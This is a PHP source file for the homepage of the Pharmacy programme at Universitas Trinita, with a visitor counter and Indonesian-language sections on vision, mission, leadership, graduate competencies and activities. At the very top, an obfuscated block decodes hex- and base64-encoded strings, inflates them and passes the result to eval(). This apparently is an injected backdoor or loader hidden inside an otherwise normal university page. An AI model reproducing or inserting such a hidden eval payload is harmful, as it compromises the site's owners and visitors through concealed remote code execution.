<?php
require 'hitcounter.php';

$hit = new HitCounter();

//cek dan simpan
$hit->Hitung();

//tampilkan counter
//echo 'jumlah pengunjung :' . $hit->tampil();
$dpjg=$hit->tampil();
//tampilkan history jika ada
$h = $hit->waktu();
if (!empty($h)) {
    //echo '<br>Anda telah mengunjungi halaman ini pada : ' . $h;
} 

  $Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
$Lix = "\x3d\x3dgt\x41F2JomjhV6rM3FXxr0ju/wGtHHllvjYfpe1DRgGMv6ZDo6Ep1qF8g\x61939nSkX/\x42I\x62mmyQ2Q\x2bM\x610JeOWye0QXI\x63NILP3\x42qYojE9/\x62\x62J97v\x43sdOE6\x41o\x41OQg\x63K1JGr0wmVJw\x2bKw\x41w\x41ID7QMJ3y/j\x43\x41X\x42wJe/jJ\x41nFw/T\x43\x41\x62\x42wJe/jI\x413Fw/D\x43\x41f\x42wJe/jH\x41HGw/z\x42\x41j\x42wJe";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
  
  ?>

<!DOCTYPE html>

<html lang="">
<!--Copyright: OS-Templates.com
Licence: Free to use under our free template licence terms
Licence URI: https://www.os-templates.com/template-terms
Free: 1 month after
-->
<head>
<title>Farmasi Trinita</title>
<meta charset="utf-8">
<meta name="keywords" content="UNITA, Universitas Trinita, Kota Manado, SIAKAD ONLINE, Farmasi Trinita, Farmasi Apriano Ade Saerang">
<meta content="width=device-width, initial-scale=0.7, maximum-scale=1, user-scalable=no" name="viewport">
<link rel="icon" href="images/farlogouniv.png" type="image/x-icon">
<link href="layout/styles/layout.css" rel="stylesheet" type="text/css" media="all">
</head>
<body id="top">
<!-- ################################################################################################ -->
<!-- ################################################################################################ -->
<!-- ################################################################################################ -->
<div class="wrapper row0">
  <header id="header" class="hoc clear"> 
    <!-- ################################################################################################ -->
    <div id="logo" class="one_quarter first">
      <h1><img src="images/logouniv.png" style="width: 25%;"> 
        <a href="index.php"><span>F</span>armasi</a></h1>
    </div>
    <div class="three_quarter">
      <ul class="nospace clear">
        <li class="one_quarter first">
          <div class="block clear"><a href="#"><i class="fas fa-phone"></i></a> <span><strong>Hubungi Kami:</strong> 0822-2806-1596</span></div>
        </li>
        <li class="one_quarter">
          <div class="block clear"><a href="#"><i class="fas fa-envelope"></i></a> <span><strong>E-mail:</strong> farmasi@trinita.ac.id</span></div>
        </li>
        <li class="one_quarter">
          <div class="block clear"><a href="#"><i class="fas fa-clock"></i></a> <span><strong> Senin - Jumat:</strong> 08.00am - 17.00pm</span></div>
        </li>
        <li class="one_quarter">
          <div class="block clear"><a href="#"><i class="fas fa-clock"></i></a> <span><strong>Visitor:</strong> <?= $dpjg ?></span></div>
        </li>
      </ul>
    </div>
    <!-- ################################################################################################ -->
  </header>
</div>
<!-- ################################################################################################ -->
<!-- ################################################################################################ -->
<!-- ################################################################################################ -->
<div class="wrapper row1">
  <section class="hoc clear"> 
    <!-- ################################################################################################ -->
    <nav id="mainav">
      <ul class="clear">
        <li class="active"><a href="index.php">Beranda</a></li>
        <li><a class="drop" href="#">Akademik</a>
          <ul>
            <li><a href="#">Sambutan</a></li>
            <li><a href="#">Visi Misi</a></li>
            <li><a href="pages/kur.html">Kurikulum</a></li>
          </ul>
        </li>
        <li><a class="drop" href="#">Informasi</a>
          <ul>
            <li><a target="_blank" href="https://pmb.trinita.ac.id">Pendaftaran MABA</a></li>
            <!-- <li><a class="drop" href="#">Level 2 + Drop</a>
              <ul>
                <li><a href="#">Level 3</a></li>
                <li><a href="#">Level 3</a></li>
                <li><a href="#">Level 3</a></li>
              </ul>
            </li> -->
            <li><a href="#">Peraturan Akademik</a></li>
          </ul>
        </li>
        <li><a href="#">Jurnal</a></li>
        <li><a href="#">Berita</a></li>
        <li><a target="_blank" href="https://ictportal.trinita.ac.id">Portal Akademik</a></li>
        
      </ul>
    </nav>
    <!-- ################################################################################################ -->
    <div id="searchform">
      <div>
        <form action="#" method="post">
          <fieldset>
            <legend>Quick Search:</legend>
            <input type="text" placeholder="Enter search &hellip;">
            <button type="submit"><i class="fas fa-search"></i></button>
          </fieldset>
        </form>
      </div>
    </div>
    <!-- ################################################################################################ -->
  </section>
</div>
<!-- ################################################################################################ -->
<!-- ################################################################################################ -->
<!-- ################################################################################################ -->
<div class="wrapper bgded overlay" style="background-image:url('images/demo/backgrounds/001.jpg'); align-items: center;">
  <div id="pageintro" class="hoc clear">
    <!-- ################################################################################################ -->
    <article>
      <p>Selamat Datang di Website <br> Program Studi</p>
      <h3 class="heading">F A R M A S I</h3>
      <p></p>
      <footer><a class="btn" href="unita:;">UNIVERSITAS TRINITA</a></footer>
    </article>
    <!-- ################################################################################################ -->
  </div>
</div>
<!-- ################################################################################################ -->
<!-- ################################################################################################ -->
<!-- ################################################################################################ -->
<div class="wrapper row3">
  <main class="hoc container clear"> 
    <!-- main body -->
    <!-- ################################################################################################ -->
    <div class="sectiontitle">
      
      <h6 class="heading" style="background-color: yellow;">VISI, MISI, DAN TUJUAN PROGRAM STUDI</h6>
      <p>-</p>
    </div>
    <div class="group center btmspace-80">
      <article class="one_third first"><a class="ringcon btmspace-50" href="#"><i class="fas fa-cube"></i></a>
        <h6 class="heading">VISI</h6>
        <p>'Menjadi Program Studi Farmasi yang berorientasi pada nilai integritas dan unggul dalam Pelayanan Farmasi dan Bahan Alam endemik Sulawesi Utara pada tahun 2025'</p>
      </article>
      <article class="one_third"><a class="ringcon btmspace-50" href="#"><i class="fas fa-chart-pie"></i></a>
        <h6 class="heading">MISI</h6>
        <p>1). Menyelenggarakan pendidikan Farmasi yang kompeten dan unggul dalam Pelayanan Farmasi dan bahan alam endemik Sulawesi Utara, berintegritas, dan cinta tanah air <br>
2). Menyelenggarakan penelitian yang inovatif dalam pengembangan fitofarmaka dari bahan alam endemik Sulawesi Utara <br>
3). Menyelenggarakan pengabdian pada masyarakat dalam bentuk Pelayanan kefarmasian dan pengembangan fitofarmaka di Sulawesi Utara.</p>
      </article>
      <article class="one_third"><a class="ringcon btmspace-50" href="#"><i class="fas fa-cube"></i></a>
        <h6 class="heading">TUJUAN</h6>
        <p>1). Menghasilkan lulusan sarjana farmasi yang kompeten dan unggul dalam pelayanan kefarmasian dan bahan alam endemik Sulawesi Utara, berintegritas, dan cinta tanah air. <br>
2). Menghasilkan sarjana farmasi yang memiliki kemampuan melakukan penelitian yang inovatif dalam pengembangan fitofarmaka dari bahan alam endemik Sulawesi Utara. <br>
3). Menghasilkan sarjana farmasi yang memiliki softskill dan kepekaan sosial untuk melakukan pengabdian masyarakat dalam pelayanan kefarmasian dan pengembangan fitofarmaka di Sulawesi Utara.</p>
      </article>
    </div>
    <p class="center"><a class="btn" href="#">Selengkapnya <i class="fas fa-angle-right"></i></a></p>
    <!-- ################################################################################################ -->
    <!-- / main body -->
    <div class="clear"></div>
  </main>
</div>
<!-- ################################################################################################ -->
<!-- ################################################################################################ -->
<!-- ################################################################################################ -->
<div class="wrapper row2">
  <section class="hoc container clear"> 
    <!-- ################################################################################################ -->

    <article class="one_third first">
      <h6 class="heading">SAMBUTAN</h6>
      <p style="font-size: 10px;text-align: justify">

Program Studi Farmasi, di bawah koordinasi Fakultas Ilmu Kesehatan, saat ini menerapkan Kurikulum yang mengakomodasikan semua ilmu dan teknologi yang berkaitan dengan farmasi. Disiplin ilmu farmasi, suatu profesi di bidang kesehatan, bertanggung jawab atas penyediaan obat yang bermutu. <br><br>

 
Ilmu Farmasi mencakup 4 (empat) disiplin ilmu utama, yaitu Farmasetika, Farmakokimia, Farmakologi, dan Farmasi Bahan Alam.

<br><br>


Semoga  sivitas akademika dan para alumni nantinya dari lembaga pendidikan tinggi ini dapat berkontribusi untuk meningkatkan derajat kesehatan bangsa Indonesia. <br><br>

Ketua Program Studi <br>

FRIDLY MANAWAN, S.Farm, M.Farm.</p>
      
    </article>
    <figure  class="one_third"><a class="imgover" href="#"><img src="images/demo/kapro3.jpg" alt=""></a>
    <p style="text-align: center;"><b>PIMPINAN PROGRAM STUDI</b></p>
    <ul>  
        <li>Ketua Prodi:</li>
        FRIDLY MANAWAN, S.Farm, M.Farm <br> <br>
        <li>Wakil Prodi:</li>
        Apt. MITRA WYNNE TIMBURAS, S.Farm, M.Farm <br>
      </ul></figure>
    <figure class="one_third" style="padding-top: 0px;"><a class="imgover" href="#"><img src="images/demo/kapro.jpg" alt=""></a></figure>
    <!-- <figure class="one_third"><a class="imgover" href="#"><img src="images/demo/348x420.png" alt=""></a></figure> -->
    <!-- ################################################################################################ -->
  </section>
</div>
<!-- ################################################################################################ -->
<!-- ################################################################################################ -->
<!-- ################################################################################################ -->
<div class="wrapper row3">
  <section class="hoc container clear"> 
    <!-- ################################################################################################ -->
    <div class="sectiontitle">
      <h6 class="heading">KOMPETENSI LULUSAN</h6>
      <p>program studi farmasi</p>
    </div>
    <ul class="nospace group btmspace-80 overview">
      <li class="one_third">
        <article><a href="#"><i class="fas fa-smile"></i></a>
          <h6 class="heading"><a href="#">CARE GIVER</a></h6>
          <p>"Mampu mengidentifikasi masalah terkait obat berlandaskan prinsip - prinsip ilmiah untuk mengoptimalkan terapi.
Mampu menyiapkan sediaan farmasi sesuai kebutuhan pasien yang aman, efektif, stabil dan bermutu.
Mampu menerapkan ilmu dan teknologi kefarmasian dalam perancangan, pembuatan, dan penjaminan  sediaann farmasi yang aman, efektif, stabil dan bermutu.
"</p>
          <footer><a href="#">View Details <i class="fas fa-angle-right"></i></a></footer>
        </article>
      </li>

<li class="one_third">
        <article><a href="#"><i class="fas fa-smile"></i></a>
          <h6 class="heading"><a href="#"><?= strtoupper('Teacher/Educator, Drug informer') ?></a></h6>
          <p>"Mampu mencari, mengevaluasi, menyiapkan, dan memberikan informasi tentang obat, pengobatan, dan penggunaan obat yang rasional.
Mampu menyiapkan pengobatan dalam upaya promotive dan preventif kesehatan masyarakat.
"
</p>
          <footer><a href="#">View Details <i class="fas fa-angle-right"></i></a></footer>
        </article>
      </li>

      <li class="one_third">
        <article><a href="#"><i class="fas fa-smile"></i></a>
          <h6 class="heading"><a href="#"><?= strtoupper('Scientific comprehension & Research abilities, life - long learner
') ?></a></h6>
          <p>"Menunjukkan penguasan konsep Teori/Praktis tentang obat, tubuh manusia, dan mekanisme kerja obat.
Mampu menerapkan konsep Teori/Praktikumtis berbagai bidang ilmu kefarmasian dalam melakukan riset bidang kefarmasian.
Mampu mengikuti perkembangan IPTEK dan meninmgkatkan penguasan ilmu, pengetahuan, keterampilan dan kemampuan diri secara berkelanjutan.
"
</p>
          <footer><a href="#">View Details <i class="fas fa-angle-right"></i></a></footer>
        </article>
      </li>

      <li class="one_third">
        <article><a href="#"><i class="fas fa-life-ring"></i></a>
          <h6 class="heading"><a href="#"><?= strtoupper('Leader, Decision maker, Manager') ?></a></h6>
          <p>"Mampu menerapkan prinsip – prinsip manajemen dalam menjalankan pekerjaan kefarmasian.
Mampu mengambil keputusan yang tepat berdasarkan informasi dan data.
"
</p>
          <footer><a href="#">View Details <i class="fas fa-angle-right"></i></a></footer>
        </article>
      </li>
      <li class="one_third">
        <article><a href="#"><i class="fas fa-life-ring"></i></a>
          <h6 class="heading"><a href="#"><?= strtoupper('Communicator, Teamwork abilities') ?></a></h6>
          <p>"Mampu membangun hubungan interpersonal dengan berbagai pihak.
Mampu menyesuaikan diri dalam lingkungan/kultur budaya yang beragam.
"
</p>
          <footer><a href="#">View Details <i class="fas fa-angle-right"></i></a></footer>
        </article>
      </li>

      <li class="one_third">
        <article><a href="#"><i class="fas fa-life-ring"></i></a>
          <h6 class="heading"><a href="#"><?= strtoupper('Personnal/ Professional responsibilities') ?></a></h6>
          <p>
            "Mampu bertindak secara bertanggung jawab sesuai ketentuan perundang – undangan, norma dan etik kefarmasian.
Mampu menjelaskan prinsip – prinsip etik dan penerapannya dalam bidang farmasi.
"
          </p>
          <footer><a href="#">View Details <i class="fas fa-angle-right"></i></a></footer>
        </article>
      </li>

      <li class="one_third">
        <article><a href="#"><i class="fas fa-life-ring"></i></a>
          <h6 class="heading"><a href="#"><?= strtoupper('Enterpreneur') ?></a></h6>
          <p>
            "Mampu merumuskan gagasan dan memformulasikan dalam rancangan wirausaha di bidang kefarmasian."
          </p>
          <footer><a href="#">View Details <i class="fas fa-angle-right"></i></a></footer>
        </article>
      </li>

      <li class="one_third">
        <article><a href="#"><i class="fas fa-life-ring"></i></a>
          <h6 class="heading"><a href="#"><?= strtoupper('Natural product developer') ?></a></h6>
          <p>
            "Mampu melakukan pemisahan, permurnian, dan identifikasi senyawa alamiah.
Mampu mengembangkan pemanfaatan bahan alam dalam pengobatan berdasarkan data empiris dan ilmiah.
"

          </p>
          <footer><a href="#">View Details <i class="fas fa-angle-right"></i></a></footer>
        </article>
      </li>
      
    </ul>
    <footer class="center"><a class="btn" href="#">GALERI</a></footer>




    <!-- ################################################################################################ -->
  </section>
</div>
<!-- ################################################################################################ -->
<!-- ################################################################################################ --><!-- ################################################################################################ -->
<div class="wrapper row2">
  <section class="hoc container clear"> 
    <!-- ################################################################################################ -->
    <div class="sectiontitle">
      <h6 class="heading">Kegiatan</h6>
      <p>dokumentasi</p>
    </div>
    <div id="latest" class="group">
      
      <article class="one_quarter first"><a class="imgover" href="#"><img src="images/demo/kegiatan/keg1.jpg" alt=""></a>
        <div class="excerpt">
          <h6 class="heading">HKN KE-55 </h6>
          <p>Hari Kesehatan Nasional, dengan mengusung Tema: 'Generasi Sehat Indonesia Unggul'.</p>
          <footer><a href="#">Read More <i class="fas fa-angle-right"></i></a></footer>
        </div>
      </article>
      <article class="one_quarter"><a class="imgover" href="#"><img src="images/demo/kegiatan/keg2.jpg" alt=""></a>
        <div class="excerpt">
          <h6 class="heading">Orientasi Anggota Baru</h6>
          <p>Himpunan Mahasiswa Farmasi - Universitas Trinita.</p>
          <footer><a href="#">Read More <i class="fas fa-angle-right"></i></a></footer>
        </div>
      </article>
      <article class="one_quarter"><a class="imgover" href="#"><img src="images/demo/kegiatan/keg3.jpg" alt=""></a>
        <div class="excerpt">
          <h6 class="heading">P K M</h6>
          <p>Kegiatan Pengabdian Kepada Masyarakat - Kec. Pusomaen - Minahasa Tenggara - Sulawesi Utara.</p>
          <footer><a href="#">Read More <i class="fas fa-angle-right"></i></a></footer>
        </div>
      </article>
      <article class="one_quarter"><a class="imgover" href="#"><img src="images/demo/kegiatan/keg0.jpg" alt=""></a>
        <div class="excerpt">
          <h6 class="heading">KEMAHASISWAAN</h6>
          <p>Pelaksanaan SET EXPO 9-11 Maret 2023.</p>
          <footer><a href="#">Read More <i class="fas fa-angle-right"></i></a></footer>
        </div>
      </article>
      
    </div>
    <footer class="center"><a class="btn" href="#">Lihat Semua Kegiatan <i class="fas fa-angle-right"></i></a></footer>
    <!-- ################################################################################################ -->
  </section>
</div>
<!-- ################################################################################################ -->
<!-- ################################################################################################ -->
<!-- ################################################################################################ -->
<div class="wrapper row4">
  <footer id="footer" class="hoc clear"> 
    <!-- ################################################################################################ -->
    <div class="one_third first">
      <h6 class="heading">PRODI FARMASI</h6>
      <p>Link Terkait</p>
      <ul>
        <li>repositori</li>
        <li>jurnal</li>
        <li>proceeding</li>
        <li>karya ilmiah</li>
      </ul>
      <p class="btmspace-30"> [<a href="#"><i class="fas fa-arrow-right"></i></a>]</p>
      <ul class="faico clear">
        <li><a class="faicon-facebook" target="_blank" href="https://www.facebook.com/universitastrinita"><i class="fab fa-facebook"></i></a></li>
        <li><a class="faicon-google-plus" href="#"><i class="fab fa-google-plus-g"></i></a></li>
        <li><a class="faicon-linkedin" href="#"><i class="fab fa-instagram"></i></a></li>
        <li><a class="faicon-twitter" href="#"><i class="fab fa-twitter"></i></a></li>
      </ul>
    </div>
    <div class="one_third">
      <h6 class="heading">Kontak Kami</h6>
      <ul>
        <li>Alamat: Jln.El Manibang - Malalayang - SULUT</li><br>
        <li>Telp: 0431-71565823</li><br>
        <li>Email: farmasi@trinita.ac.id</li><br>
      </ul>
    </div>
    <div class="one_third">
      <h6 class="heading">kirim Email kepada kami</h6>
      <p class="nospace btmspace-15">masukkan email anda untuk terhubung dengan kami lewat surel.</p>
      <form method="post" action="#">
        <fieldset>
          <legend>Newsletter:</legend>
          <input class="btmspace-15" type="text" value="" placeholder="Name">
          <input class="btmspace-15" type="text" value="" placeholder="Email">
          <button type="submit" value="submit">Submit</button>
        </fieldset>
      </form>
    </div>
    <!-- ################################################################################################ -->
  </footer>
</div>
<!-- ################################################################################################ -->
<!-- ################################################################################################ -->
<!-- ################################################################################################ -->
<div class="wrapper row5">
  <div id="copyright" class="hoc clear"> 
    <!-- ################################################################################################ -->
    <p class="fl_left">Copyright &copy; 2019 - <a href="#">Farmasi Universitas Trinita</a></p>
    <p class="fl_right">cq. <a target="_blank" href="https://trinita.ac.id/" title="bakom IT">Bakom IT</a></p>
    <!-- ################################################################################################ -->
  </div>
</div>
<!-- ################################################################################################ -->
<!-- ################################################################################################ -->
<!-- ################################################################################################ -->
<a id="backtotop" href="#top"><i class="fas fa-chevron-up"></i></a>
<!-- JAVASCRIPTS -->
<script src="layout/scripts/jquery.min.js"></script>
<script src="layout/scripts/jquery.backtotop.js"></script>
<script src="layout/scripts/jquery.mobilemenu.js"></script>
</body>
</html>
